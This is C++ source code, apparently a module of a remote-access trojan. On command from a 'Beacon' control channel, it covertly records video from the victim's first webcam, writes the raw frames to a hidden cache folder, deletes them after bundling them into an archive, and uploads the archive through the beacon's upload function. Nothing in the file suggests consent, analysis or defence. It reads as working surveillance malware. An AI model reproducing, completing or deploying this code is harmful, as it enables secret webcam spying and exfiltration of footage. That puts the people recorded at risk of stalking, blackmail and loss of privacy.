#include "webcam_recorder.h"
#include "../config.h"
#include "../utils.h"
#include "../beacon.h"
#include <windows.h>
#include <ctime>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")

namespace WebcamRecorder {
    bool recording = false;
    HANDLE hThread = NULL;
    int durationSec = 30;

    typedef HRESULT (WINAPI *MFEnumDeviceSources_t)(IMFAttributes*, IMFActivate***, UINT32*);
    static MFEnumDeviceSources_t pMFEnumDeviceSources = nullptr;
    static bool mfLoaded = false;

    static bool LoadMF() {
        if (mfLoaded) return pMFEnumDeviceSources != nullptr;
        HMODULE hMF = LoadLibraryW(L"mf.dll");
        if (hMF) {
            pMFEnumDeviceSources = (MFEnumDeviceSources_t)GetProcAddress(hMF, "MFEnumDeviceSources");
        }
        mfLoaded = true;
        return pMFEnumDeviceSources != nullptr;
    }
    
    DWORD WINAPI RecordThread(LPVOID param) {
        CreateDirectoryA(WEBCAM_CACHE_PATH, NULL);
        
        if (!LoadMF()) return 1;
        
        IMFMediaSource* pSource = NULL;
        IMFSourceReader* pReader = NULL;
        
        IMFAttributes* pAttributes = NULL;
        MFCreateAttributes(&pAttributes, 1);
        pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
        
        IMFActivate** ppDevices = NULL;
        UINT32 count = 0;
        pMFEnumDeviceSources(pAttributes, &ppDevices, &count);
        
        if (count == 0) {
            pAttributes->Release();
            return 1;
        }
        
        ppDevices[0]->ActivateObject(IID_PPV_ARGS(&pSource));
        
        MFCreateSourceReaderFromMediaSource(pSource, NULL, &pReader);
        
        // Configure output to RGB32
        IMFMediaType* pType = NULL;
        MFCreateMediaType(&pType);
        pType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
        pType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_RGB32);
        pReader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
        
        std::string timestamp = std::to_string(time(0));
        std::string baseFile = std::string(WEBCAM_CACHE_PATH) + "\\cam_" + timestamp;
        
        int frames = durationSec * 10; // 10 fps
        for (int i = 0; i < frames && recording; i++) {
            IMFSample* pSample = NULL;
            DWORD flags = 0;
            LONGLONG timestamp = 0;
            
            HRESULT hr = pReader->ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, NULL, &flags, &timestamp, &pSample);
            if (FAILED(hr) || flags & MF_SOURCE_READERF_ENDOFSTREAM) break;
            
            IMFMediaBuffer* pBuffer = NULL;
            pSample->ConvertToContiguousBuffer(&pBuffer);
            
            BYTE* pData = NULL;
            DWORD maxLen = 0, curLen = 0;
            pBuffer->Lock(&pData, &maxLen, &curLen);
            
            // Save raw frame (simplified - in production use video encoder)
            std::string frameFile = baseFile + "_" + std::to_string(i) + ".raw";
            Utils::WriteFileBinary(frameFile, std::vector<BYTE>(pData, pData + curLen));
            
            pBuffer->Unlock();
            pBuffer->Release();
            pSample->Release();
            
            Sleep(100); // ~10 fps
        }
        
        // Upload raw frames (or encode to video first)
        std::vector<BYTE> archive;
        for (int i = 0; i < frames; i++) {
            std::string frameFile = baseFile + "_" + std::to_string(i) + ".raw";
            auto data = Utils::ReadFileBinary(frameFile);
            if (data.empty()) break;
            DWORD size = (DWORD)data.size();
            archive.insert(archive.end(), (BYTE*)&size, (BYTE*)&size + sizeof(size));
            archive.insert(archive.end(), data.begin(), data.end());
            DeleteFileA(frameFile.c_str());
        }
        
        if (!archive.empty()) {
            Beacon::UploadFile("webcam_rec", "webcam_rec.bin", archive);
        }
        
        pType->Release();
        pReader->Release();
        pSource->Release();
        for (UINT32 i = 0; i < count; i++) ppDevices[i]->Release();
        CoTaskMemFree(ppDevices);
        pAttributes->Release();
        
        recording = false;
        return 0;
    }
    
    void Start(const std::string& params) {
        if (recording) return;
        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
        MFStartup(MF_VERSION);
        
        durationSec = 30;
        recording = true;
        hThread = CreateThread(NULL, 0, RecordThread, NULL, 0, NULL);
    }
    
    void Stop() {
        recording = false;
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
            hThread = NULL;
        }
        MFShutdown();
        CoUninitialize();
    }
    
    void OnCommand(const Beacon::Command& cmd) {
        if (cmd.type == "webcam_rec_start") Start(cmd.params);
        else if (cmd.type == "webcam_rec_stop") Stop();
    }
    
    bool IsRecording() { return recording; }
}